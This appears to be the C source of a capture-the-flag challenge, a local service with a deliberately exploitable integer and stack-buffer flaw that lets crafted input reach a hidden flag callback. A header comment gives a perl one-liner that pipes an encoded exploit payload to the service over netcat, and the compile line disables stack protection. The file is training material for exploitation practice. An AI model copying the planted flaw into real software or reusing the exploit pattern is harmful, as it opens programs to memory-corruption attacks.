// compile with gcc -fno-stack-protector -static -O3 -s -std=c99 -o sillyjimmy_consumer ctf_sillyjimmy_consumer.c

// perl -e 'print "\xF6\xFF\xFF\xFF\x79\x90\x6d\x90\x6d\x90\x69\x90\x6a\x00\x79\x90\x6d\x90\x6d\x90\x69\x90\x6a\x00\x79\x90\x6d\x90\x6d\x90\x69\x90\x00\x00\x00\x00\x01\x02\x03\x04\x01\x02\x03\x04\x3b\xc5\xc5\xc5" ' | nc 127.0.0.1 7331

#define _POSIX_C_SOURCE 2

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#if defined(WIN32) || defined(_WIN32)
    #include <windows.h>
    #include <io.h> // _pipe()
    #include <fcntl.h> 
    FILE *popen(const char*, const char*);
    int pclose(FILE*);
    int fileno(FILE*);
    #define pipe _pipe
    #define write _write
    #define read _read
    #define OPEN_MODE_STR "wb"
#else
    // nix platforms
    #include <unistd.h>
    #define OPEN_MODE_STR "w"
#endif

///////////////////////////////////////////////////////////////////////////////////

#define PORT 7331
#define BUFFER_SIZE 100

typedef void(*Callgate)(int);

int main(int argc, char**);
///////////////////////////////////////////////////////////////////////////////////

// global variables
Callgate callgates[255];
int outpipe;
int sprintf_len;

const char jimmyconfused[] = "Jimmy is confused :/\n\n";
const char outofmem[] = "Jimmy is out memory :/\n\n";

///////////////////////////////////////////////////////////////////////////////////

void consumer_goodcall(int outpipe)
{
    const char s[] = "\xFE";
    write(outpipe, s, sizeof(s));
}
void consumer_badcall(int outpipe)
{
    const char s[] = "Jimmy is not giving you his flag :/\n\n";
    write(outpipe, s, sizeof(s));
}

void init_consumer()
{
#if defined(WIN32) || defined(_WIN32)
    _setmode(fileno(stdin), O_BINARY);
    _setmode(fileno(stdout), O_BINARY);
#endif
    for(int i = 0; i < 254;i++)
    {
        callgates[i] = &consumer_badcall;
    }
    callgates[254] = &consumer_goodcall;
}

///////////////////////////////////////////////////////////////////////////////////

void untransformshell(char *buf, int size)
{
	char *p = buf;
	/*
	char temp, *end;
	end = p + size-1;
	
	while(end > p)
	{
		temp = *p;
		*p = *end;
		*end = temp;
		p++;
		end--;
	}*/
	for(int i= 0; i < size; i++)
		p[i] = p[i] ^ 0xC5;
		
}


int handle_consumer()
{
    char replybuf[BUFFER_SIZE];
    uint32_t idx;
    uint32_t slot;
    uint32_t memsize;
    
    int size1;
    int size2;
    
    size1 = fread(&outpipe, sizeof(int), 1, stdin);
    size2 = fread(&idx, sizeof(int), 1, stdin);
    
    if(size1 == 1 && size2 == 1)
    {
        // decode the idx value
        untransformshell((char*)&idx, sizeof(idx));
        
        memsize = BUFFER_SIZE + idx*10 + 1;
        slot = memsize-1;
        
        // cap the maximum buffer size to prevent a crash
        if(memsize > 0 && memsize < BUFFER_SIZE*10)
        {
            char buffer[memsize];
            int revclen = fread(buffer, 1, BUFFER_SIZE, stdin);
            
            //decode the buffer
            untransformshell(buffer, sizeof(buffer));
            
            //printf("ret=%p main=%p\n", __builtin_frame_address(0), main);
            //printf("idx=%p slot=%p memsize=%p size1=%p outpipe=%p buffer=%p\n", &idx, &slot, &memsize, &size1, &outpipe, buffer);
            printf("jimmy %p\n", &slot);
            
            if(revclen > 0) 
            {
                //printf("memsize value %u\n", memsize);
                //printf("slot value %u\n", slot);
                
                if(memsize < BUFFER_SIZE && slot < 255)
                {
                    callgates[slot](outpipe);
                }
                else
                {
                    // replybuf has enough space for the string
                    sprintf_len = sprintf(replybuf, "Jimmy's calculation is %u \n", memsize);
                    if(sprintf_len > 0)
                    {
                        write(outpipe, replybuf, sprintf_len+1); // add 1 for the null terminator
                    }
                    else
                    {
                        write(outpipe, jimmyconfused, sizeof(jimmyconfused));
                    }
                }
            }
            else
            {
                write(outpipe, jimmyconfused, sizeof(jimmyconfused));
            }
        }
        else
        {
            write(outpipe, outofmem, sizeof(outofmem));
        }
    }
}

///////////////////////////////////////////////////////////////////////////////////

int main(int argc, char **argv)
{
    // run consumer
    //printf("CONSUMER started\n");
    init_consumer();
    handle_consumer();
    
    return 0;
}

